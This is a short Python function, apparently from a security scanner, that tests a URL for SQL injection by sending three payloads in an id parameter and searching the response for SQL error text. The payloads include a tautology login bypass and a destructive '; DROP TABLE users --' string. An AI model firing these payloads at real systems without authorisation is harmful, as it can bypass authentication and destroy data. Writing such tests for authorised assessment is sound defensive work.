import requests
from requests.exceptions import SSLError, RequestException

def test_sql_injection(url):
    """
    Tests for SQL injection vulnerabilities using basic payloads.
    Handles SSL and connection errors gracefully with clean output.
    """
    payloads = [
        "' OR 1=1 --",
        '" OR "" = "',
        "'; DROP TABLE users --"
    ]

    results = []

    for payload in payloads:
        try:
            target_url = f"{url}?id={requests.utils.quote(payload)}"
            resp = requests.get(target_url, timeout=10, verify=True)

            if "sql" in resp.text.lower() or "syntax" in resp.text.lower():
                results.append(f"⚠️ Possible SQL injection detected with payload: {payload}")
            else:
                results.append(f"✅ No SQLi detected for payload: {payload}")
        
        except SSLError:
            return {
                "error": "The SSL certificate is invalid, expired, or self-signed.",
                "note": "The site uses an untrusted certificate. Unable to perform SQL injection testing."
            }

        except RequestException:
            return {
                "error": "Connection error while testing SQL injection.",
                "note": "The site may be offline or blocked."
            }

        except Exception as e:
            results.append(f"⚠️ Unexpected error for payload {payload}: {str(e)}")

    return "\n".join(results)
